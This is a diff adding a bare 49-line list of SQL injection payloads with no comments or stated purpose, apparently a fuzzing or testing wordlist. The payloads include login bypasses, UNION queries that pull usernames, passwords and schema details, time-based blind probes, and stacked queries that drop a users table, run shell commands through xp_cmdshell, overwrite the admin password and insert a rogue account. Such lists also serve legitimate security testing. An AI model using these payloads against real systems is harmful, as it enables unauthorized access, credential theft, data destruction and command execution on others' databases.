@@ -1,0 +1,49 @@
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+' OR '1'='1' /*
+') OR ('1'='1
+') OR ('1'='1' --
+1' OR '1'='1
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1' AND SLEEP(5)#
+1 AND SLEEP(5)
+1' WAITFOR DELAY '0:0:5'--
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' UNION SELECT username, password FROM users--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' AND substring(password,1,1)='a'--
+' AND ascii(substring(password,1,1))>96--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; INSERT INTO users (username,password) VALUES ('hacker','pass')--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
